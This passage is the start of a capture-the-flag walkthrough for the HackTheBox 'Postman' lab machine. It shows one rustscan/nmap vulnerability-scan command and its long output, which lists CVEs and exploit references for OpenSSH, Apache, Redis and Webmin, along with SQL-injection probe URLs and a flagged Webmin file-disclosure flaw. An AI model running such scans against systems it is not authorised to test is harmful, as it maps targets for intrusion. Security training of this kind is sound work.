# Postman Walkthrough

![postman](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Postman/postman.png)

## let's first scan out machine with rustscan.

```console
sudo rustscan -a 10.10.10.160 -b 100 --range 1-65535 -- -A -O --script=vuln
```

### Result

```
PORT      STATE SERVICE REASON         VERSION 
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:7.6p1:  
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A
*EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-25017/        5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/     5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CV
E-2019-6111/    *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2019-6111/     *EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/    *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/  *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C8
4C508837551A19  *EXPLOIT* 
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC
9D6DDDD97F9E97  *EXPLOIT* 
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT* 
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT* 
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111 
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT* 
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT* 
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT* 
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS
*EXPLOIT* 
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3
C649B764E13FB0  *EXPLOIT* 
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648
B4D14B75563283  *EXPLOIT* 
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT* 
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT* 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919 
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473 
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT* 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110 
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109 
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685 
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS/        0.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_E
NUMUSERS/       *EXPLOIT* 
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT* 
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) 
| http-sql-injection:  
|   Possible sqli for queries: 
|     http://10.10.10.160:80/js/?C=N%3BO%3DD%27%20OR%20sqlspider 
|     http://10.10.10.160:80/js/?C=S%3BO%3DA%27%20OR%20sqlspider 
|     http://10.10.10.160:80/js/?C=D%3BO%3DA%27%20OR%20sqlspider 
|_    http://10.10.10.160:80/js/?C=M%3BO%3DA%27%20OR%20sqlspider 
| http-enum:  
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)' 
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)' 
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)' 
|_  /upload/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)' 
|_http-jsonp-detection: Couldn't find any JSONP endpoints. 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable 
| vulners:  
|   cpe:/a:apache:http_server:2.4.29:  
|       E899CC4B-A3FD-5288-BB62-A4201F93FDCC    10.0    https://vulners.com/githubexploit/E899CC4B-A3FD-5288-BB62-A4201F93FDCC
*EXPLOIT* 
|       5DE1B404-0368-5986-856A-306EA0FE0C09    10.0    https://vulners.com/githubexploit/5DE1B404-0368-5986-856A-306EA0FE0C09
*EXPLOIT* 
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943 
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720 
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790 
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275 
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/ 7.2     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/      7.2     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0211/     *EXPLOIT* 
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4
259C41D8BDA0AB  *EXPLOIT* 
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT* 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211 
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15715/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/   *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/
*EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8
*EXPLOIT* 
|       CVE-2022-22721  6.8     https://vulners.com/cve/CVE-2022-22721 
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438 
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452 
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312 
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715 
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2
*EXPLOIT* 
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332
*EXPLOIT* 
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224 
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/      6.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0217/     *EXPLOIT* 
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217 
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927 
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098 
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1333/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/    *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2020-9490/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2020-9490/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2020-9490/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2020-9490/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/       5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-1934/      *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/     5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15710/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-9490/       5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-9490/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-9490/       5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-9490/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2020-9490/      5.0     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2020-9490/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2020-9490/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2020-9490/
*EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/        5.0     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15710/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-9490/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-9490/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2020-9490/   5.0     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2020-9490/  *EXPLOIT* 
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719 
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798 
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193 
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690 
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490 
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934 
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567 
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081 
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220 
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196 
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199 
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189 
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333 
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303 
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/       4.9     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-0197/      *EXPLOIT* 
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197 
|       MSF:ILITIES/UBUNTU-CVE-2018-1302/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/     *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2020-11993/        4.3     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
20-11993/       *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-11993/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-11993/     *EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/      4.3     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2020-11993/        4.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
20-11993/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11993/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
20-11993/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
19-10092/       *EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2020-11993/  4.3     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2020-11993/ *EXPLOIT* 
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993 
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092 
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302 
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301 
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763 
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D
*EXPLOIT* 
|       1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT* 
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/     *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/      3.5     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2018-1283/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283 
|_      PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT* 
| http-internal-ip-disclosure:  
|_  Internal IP Leaked: 127.0.1.1 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-server-header: Apache/2.4.29 (Ubuntu) 
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
6379/tcp  open  redis   syn-ack ttl 63 Redis key-value store 4.0.9 
| vulners:  
|   cpe:/a:redislabs:redis:4.0.9:  
|       CVE-2018-11219  7.5     https://vulners.com/cve/CVE-2018-11219 
|       CVE-2018-11218  7.5     https://vulners.com/cve/CVE-2018-11218 
|       MSF:ILITIES/UBUNTU-CVE-2019-10193/      6.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-10193/    *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2019-10192/      6.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-10192/    *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-10192/      6.5     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10192/    *
EXPLOIT* 
|       CVE-2021-32626  6.5     https://vulners.com/cve/CVE-2021-32626 
|       CVE-2021-21309  6.5     https://vulners.com/cve/CVE-2021-21309 
|       CVE-2019-10193  6.5     https://vulners.com/cve/CVE-2019-10193 
|       CVE-2019-10192  6.5     https://vulners.com/cve/CVE-2019-10192 
|       CVE-2021-32761  6.0     https://vulners.com/cve/CVE-2021-32761 
|       EXPLOITPACK:9F45D8CAB6F6E66F98E43562AEAB5DE2    4.6     https://vulners.com/exploitpack/EXPLOITPACK:9F45D8CAB6F6E66F98
E43562AEAB5DE2  *EXPLOIT* 
|       EDB-ID:44904    4.6     https://vulners.com/exploitdb/EDB-ID:44904      *EXPLOIT* 
|       CVE-2018-12326  4.6     https://vulners.com/cve/CVE-2018-12326 
|       CVE-2021-32672  4.0     https://vulners.com/cve/CVE-2021-32672 
|       PACKETSTORM:148225      0.0     https://vulners.com/packetstorm/PACKETSTORM:148225      *EXPLOIT* 
|_      1337DAY-ID-30598        0.0     https://vulners.com/zdt/1337DAY-ID-30598        *EXPLOIT* 
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd) 
| http-slowloris-check:  
|   VULNERABLE: 
|   Slowloris DOS attack 
|     State: LIKELY VULNERABLE 
|     IDs:  CVE:CVE-2007-6750 
|       Slowloris tries to keep many connections to the target web server open and hold 
|       them open as long as possible.  It accomplishes this by opening connections to 
|       the target web server and sending a partial request. By doing so, it starves 
|       the http server's resources causing Denial Of Service. 
|        
|     Disclosure date: 2009-09-17 
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 
|_      http://ha.ckers.org/slowloris/ 
|_http-jsonp-detection: Couldn't find any JSONP endpoints. 
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug) 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
| http-litespeed-sourcecode-download:  
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333) 
| /index.php source code: 
| <h1>Error - Document follows</h1> 
|_<p>This web server is running in SSL mode. Try the URL <a href='https://Postman:10000/'>https://Postman:10000/</a> instead.<
br></p> 
| http-vuln-cve2006-3392:  
|   VULNERABLE: 
|   Webmin File Disclosure 
|     State: VULNERABLE (Exploitable) 
|     IDs:  CVE:CVE-2006-3392 
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML. 
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences 
|       to bypass the removal of "../" directory traversal sequences. 
|        
|     Disclosure date: 2006-06-29 
|     References: 
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure 
|       http://www.exploit-db.com/exploits/1997/ 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392 
| http-phpmyadmin-dir-traversal:  
|   VULNERABLE: 
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion 
|     State: UNKNOWN (unable to test) 
|     IDs:  CVE:CVE-2005-3299 
